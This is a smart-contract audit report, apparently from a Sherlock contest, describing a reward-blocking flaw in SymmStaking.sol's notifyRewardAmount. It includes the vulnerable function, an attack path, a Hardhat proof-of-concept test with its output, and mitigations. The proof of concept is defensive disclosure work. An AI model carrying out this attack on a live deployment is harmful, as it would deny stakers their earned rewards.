# Malicious user will block reward by calling notifyRewardAmount with 1 amount.

### Summary

If the remaining reward token balance drops below 604,800, a malicious user can prevent all depositors from receiving rewards by calling notifyRewardAmount with an amount of 1.


### Root Cause

In notifyRewardAmount() function of SymmStaking.sol file
The function calls _addRewardsForToken() function.
In _addRewardsForToken() function , 

https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/staking/SymmStaking.sol#L366

```solidity
function _addRewardsForToken(address token, uint256 amount) internal {
		TokenRewardState storage state = rewardState[token];

		if (block.timestamp >= state.periodFinish) {
			state.rate = amount / state.duration;
		} else {
			uint256 remaining = state.periodFinish - block.timestamp;
			uint256 leftover = remaining * state.rate;
			state.rate = (amount + leftover) / state.duration;
		}

		state.lastUpdated = block.timestamp;
		state.periodFinish = block.timestamp + state.duration;
	}
```

In state.rate = (amount + leftover) / state.duration;
state.duration = 1 week = 604800

So if leftover < 604800 - 1 and call _addRewardsForToken with amount = 1, the state.rate will be 0.

So users can't receive enough reward even though many time is passed.



### Internal Pre-conditions

1. Remaining reward token amount needs to be 604800 - 1

### External Pre-conditions

N/A

### Attack Path

1. Attacker will wait until leftover will be  604800 - 1
2. Attacker call notifyRewardAmount(token, 1);

### Impact

A malicious user can effectively block all depositors from receiving staking rewards if the remaining reward token balance is below 604,800. 
By calling notifyRewardAmount with a minimal amount (e.g., 1 token), they can trigger the reward distribution mechanism in a way that prevents meaningful rewards from being allocated, leading to a denial of rewards attack. 

As a result , users will lose below 604800 reward tokens as total and this could discourage participation in the staking protocol and reduce user trust.


### PoC

In symmStaking.behavior.ts

```solidity
describe("Reward Calculation", function () {

         it("should not get reward after notifyRewardAmount", async function () {
			// Scenario: User1 deposits 604,800 SYMM, User2 deposits 302,400 SYMM, both claim USDT after 200s in 2:1 ratio.
			const depositUser1 = "604800"
			const depositUser2 = "302400"

			await stakingToken.connect(user1).approve(await symmStaking.getAddress(), depositUser1)
			await stakingToken.connect(user2).approve(await symmStaking.getAddress(), depositUser2)

			await symmStaking.connect(user1).deposit(depositUser1, user1.address)
			await symmStaking.connect(user2).deposit(depositUser2, user2.address)

			const rewardAmount = "604800"
			await usdtToken.connect(admin).approve(await symmStaking.getAddress(), rewardAmount)
			await symmStaking.connect(admin).configureRewardToken(await usdtToken.getAddress(), true)
			await symmStaking.connect(admin).notifyRewardAmount([await usdtToken.getAddress()], [rewardAmount])

			await time.increase(100)


			const user1BalanceBefore = await usdtToken.balanceOf(user1.address)
			await symmStaking.connect(user1).claimRewards()
			const user1BalanceAfter = await usdtToken.balanceOf(user1.address)
			const user1Claimed = user1BalanceAfter - user1BalanceBefore

			console.log("reward of user1 after 100s");
			console.log(user1Claimed);
			

			let user3 = context.signers.user3 //attacker

			await usdtToken.connect(admin).transfer(user3.address, 1)
			await usdtToken.connect(user3).approve(await symmStaking.getAddress(), "1")
			
			//attacking
			await symmStaking.connect(user3).notifyRewardAmount([await usdtToken.getAddress()], [1])

			await time.increase(600000)


			const user1BalanceBefore1 = await usdtToken.balanceOf(user1.address)
			await symmStaking.connect(user1).claimRewards()
			const user1BalanceAfter1 = await usdtToken.balanceOf(user1.address)
			const user1Claimed1 = user1BalanceAfter1 - user1BalanceBefore1

			console.log("reward of user1 after 600100s");
			console.log(user1Claimed1);

			const user2BalanceBefore = await usdtToken.balanceOf(user2.address)
			await symmStaking.connect(user2).claimRewards()
			const user2BalanceAfter = await usdtToken.balanceOf(user2.address)
			const user2Claimed = user2BalanceAfter - user2BalanceBefore

			console.log("reward of user2 after 600100s");
			console.log(user2Claimed);
			
		})

})
```

Run command : npx hardhat test --grep 'should not get reward after notifyRewardAmount'

Result : 

reward of user1 after 100s
67n
reward of user1 after 600100s
1n
reward of user2 after 600100s
34n


As Poc shows, users could get correct reward before attacker call notifyRewardAmount().
But after it, even though most reward time is passed, get only 1 token.

### Mitigation

There are some selection by design choice.

1. Add manage role in notifyRewardAmount() function.
2. Or if rate == 0, revert it in _addRewardsForToken() function.
